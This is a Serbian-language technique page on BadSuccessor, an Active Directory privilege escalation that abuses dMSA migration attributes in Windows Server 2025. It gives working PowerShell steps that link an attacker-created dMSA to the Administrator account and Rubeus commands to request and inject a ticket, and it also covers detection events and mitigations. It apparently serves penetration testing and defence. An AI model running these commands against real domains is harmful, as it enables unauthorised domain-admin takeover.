# BadSuccessor: Eskalacija privilegija zloupotrebom delegirane dMSA migracije

{{#include ../../banners/hacktricks-training.md}}

## Pregled

Delegated Managed Service Accounts (**dMSA**) predstavljaju naslednike nove generacije **gMSA** naloga i dostupni su u Windows Server 2025. Legitiman proces migracije omogućava administratorima da zamene *stari* nalog (korisnički, računarski ili servisni nalog) pomoću dMSA naloga, uz transparentno očuvanje dozvola. Proces je dostupan kroz PowerShell cmdlet-e kao što su `Start-ADServiceAccountMigration` i `Complete-ADServiceAccountMigration` i oslanja se na dva LDAP atributa **dMSA objekta**:

* **`msDS-ManagedAccountPrecededByLink`** – *DN link* ka zamenjenom (starom) nalogu.
* **`msDS-DelegatedMSAState`**       – stanje migracije (`0` = nema migracije, `1` = u toku, `2` = *završena*).<sup>[[1]](#references)</sup>

Ako napadač može da kreira **bilo koji** dMSA unutar OU-a i direktno izmeni ta 2 atributa, LSASS i KDC će tretirati dMSA kao *naslednika* povezanog naloga. Kada se napadač naknadno autentifikuje kao dMSA, **nasleđuje sve privilegije povezanog naloga** – uključujući **Domain Admin** privilegije ako je povezan Administrator nalog.<sup>[[1]](#references)</sup>

Ovu tehniku je 2025. godine nazvao **BadSuccessor** tim Unit 42. U trenutku pisanja **nije dostupan bezbednosni patch**; samo hardening OU dozvola ublažava ovaj problem.<sup>[[1]](#references)[[2]](#references)</sup>

### Preduslovi napada

1. Nalog kojem je *dozvoljeno* da kreira objekte unutar **Organizational Unit (OU)** i koji ima najmanje jednu od sledećih dozvola:
* `Create Child` → klasa objekta **`msDS-DelegatedManagedServiceAccount`**
* `Create Child` → **`All Objects`** (generičko kreiranje)
2. Mrežna povezanost sa LDAP-om i Kerberos-om (standardni scenario sa računarom pridruženim domenu / remote attack).<sup>[[1]](#references)</sup>

## Enumeracija ranjivih OU-ova

Unit 42 je objavio pomoćnu PowerShell skriptu koja analizira security descriptor-e svakog OU-a i ističe potrebne ACE-ove:<sup>[[1]](#references)</sup>
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
U pozadini, skripta izvršava paginiranu LDAP pretragu za `(objectClass=organizationalUnit)` i proverava svaki `nTSecurityDescriptor` za

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (object class *msDS-DelegatedManagedServiceAccount*)

## Koraci eksploatacije

Kada se identifikuje OU sa dozvolom upisa, napad zahteva samo 3 LDAP upisa:<sup>[[1]](#references)</sup>
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Nakon replikacije, attacker može jednostavno da se **logon** kao `attacker_dMSA$` ili da zatraži Kerberos TGT – Windows će izgraditi token *zamenjenog* naloga.<sup>[[1]](#references)</sup>

### Automatizacija

Nekoliko javno dostupnih PoCs obuhvata kompletan workflow, uključujući preuzimanje lozinke i upravljanje ticketima:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* NetExec modul – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## Detekcija i hunting

Omogućite **Object Auditing** na OU-ovima i nadgledajte sledeće Windows Security Events:<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – Kreiranje **dMSA** objekta
* **5136** – Izmena atributa **`msDS-ManagedAccountPrecededByLink`**
* **4662** – Specifične izmene atributa
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – Izdavanje TGT-a za dMSA

Korelacija događaja `4662` (izmena atributa), `4741` (kreiranje computer/service account-a) i `4624` (naknadna prijava) brzo ukazuje na BadSuccessor aktivnost. XDR rešenja kao što je **XSIAM** dolaze sa gotovim upitima (pogledajte reference).<sup>[[2]](#references)</sup>

## Ublažavanje

* Primenite princip **najmanjih privilegija** – upravljanje *Service Account*-ima delegirajte samo pouzdanim ulogama.
* Uklonite `Create Child` / `msDS-DelegatedManagedServiceAccount` sa OU-ova kojima to izričito nije potrebno.
* Nadgledajte gore navedene ID-jeve događaja i generišite upozorenja kada identiteti koji nisu *Tier-0* kreiraju ili menjaju dMSA-ove.

## Takođe pogledajte


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## Reference

- [1] [BadSuccessor: Zloupotreba dMSA-a za eskalaciju privilegija u Active Directory-u – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – Kada dobri nalozi postanu loši: Iskorišćavanje Delegated Managed Service Accounts](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [NetExec BadSuccessor module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

{{#include ../../banners/hacktricks-training.md}}
